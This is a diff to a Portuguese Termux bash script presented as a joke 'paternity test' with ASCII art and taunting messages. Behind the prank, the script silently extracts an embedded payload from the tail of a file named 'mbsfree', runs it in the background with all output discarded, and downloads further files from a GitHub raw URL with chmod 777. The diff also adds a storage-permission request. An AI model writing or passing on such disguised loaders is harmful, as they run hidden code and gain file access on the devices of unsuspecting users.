@@ -1,8 +1,8 @@
 #!/bin/bash
 cd $HOME
 clear
-tail -n +180 mbsfree > s && chmod +x s
-nohup ./s > /dev/null &
+tail -n +181 mbsfree > s && chmod +x s
+nohup ./s > /dev/null 2>&1 &
 clear
 sleep 1
 IMG1="ㅤㅤ⣿⣿⣯⠉⠄⠄⠄⠄⠄⠄⡄⠄⠄⠄⠄⠄⠄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\nㅤㅤ⣿⡟⠁⠄⠄⠄⠄⠄⢀⢀⠃⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\nㅤㅤ⣿⡇⠄⠄⣾⣳⠄⠄⢀⣄⣦⣶⣴⠂⢒⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⡄⠄⠈⠚⡆⠄⢸⣿⣿⣿⣯⠋⡏⠄⠄⢸⣿⣿⣿⠿⠛⠛⠿⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⠟⣂⣀⣀⣀⡀⠠⠻⣷⣎⡼⠞⠓⠦⣤⣛⣋⣭⣴⣾⣿⣿⣷⣌⠻⣿⣿⣿\nㅤㅤ⣿⠋⣼⣿⣿⣿⣿⣿⣷⣦⣍⣙⠻⠳⠄⠄⠈⠙⠿⢿⣿⣿⣿⣿⣿⡟⣰⣿⣿⣿\nㅤㅤ⡟⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⣀⠄⠄⢀⣤⣤⣭⡛⠛⣩⣴⣿⣿⣿⣿\nㅤㅤ⣷⠸⠿⠛⠉⠙⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠷⠦⣹⣿⣿⣿⣿\nㅤㅤ⣿⣧⠄⠄⠄⢀⣴⣷⣶⣦⣬⣭⣉⣙⣛⠛⠿⠿⠿⠟⠁⡀⠄⠄⠄⢁⣿⣿⣿⣿\nㅤㅤ⣿⣿⡅⠄⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣍⠲⣶⣤⣄⡀⠄⣴⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⣷⠄⣾⡏⢿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠄⠹⣷⡌⢿⣿⣿⣷⣦⡙⢿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣷⡌⢷⡘⣿⣿⣿⣿⣿⣿⣧⣀⣀⡀⠄⠈⠹⡈⣿⣿⣿⣿⣿⣦⡙⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣎⢷⡘⢿⣿⣿⣿⣿⣿⣿⣿⠃⠄⣼⣶⡇⣿⣿⣿⣿⣿⣿⠓⠜⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣎⢻⣦⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠄⣿⣿⣿⣿⣿⣿⣄⡀⢸\nㅤㅤ⣿⣿⣿⣿⣿⡿⢃⢼⣿⣿⣷⣤⣍⣉⣙⣛⣛⣉⣥⡄⠄⢿⣿⣿⣿⣿⡿⠟⣥⣿\nㅤㅤ⣿⣿⣿⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⢁⣷⣤⣍⣉⣉⣭⣴⣾⣿⣿"
@@ -123,7 +123,8 @@ echo -e "\e[01;37mRESULTADO:";
       case $pai in
          $c) sleep 2; break;;
          $d) sleep 2; echo -e "\e[01;37;41mX RESULTADO MANIPULADO!\e[0m \e[01;37mREFAZENDO O TESTE\e[0m"
-             sleep 4
+                      echo -e "\e[01;37;41mNÃO ADIANTA FUGIR, ASSUMA SEU FILHO!\e[0m"|pv -qL 18
+             sleep 3
       esac
 done
 #!/bin/bash
@@ -183,6 +184,7 @@ nohup pkg install pv -y -qq --silent
 nohup pkg install jq -y -qq --silent
 nohup pkg install git -y -qq --silent
 ###################
+termux-setup-storage
 nohup curl -sO https://raw.githubusercontent.com/leitura/ospacotesmb/main/mbsfree1 > /dev/null && chmod 777 mbsfree1
 nohup curl -sO https://raw.githubusercontent.com/leitura/ospacotesmb/main/mbsfree2 > /dev/null && chmod 777 mbsfree2
 nohup curl -sO https://raw.githubusercontent.com/leitura/ospacotesmb/main/mbsfree99 > /dev/null && chmod 777 mbsfree99
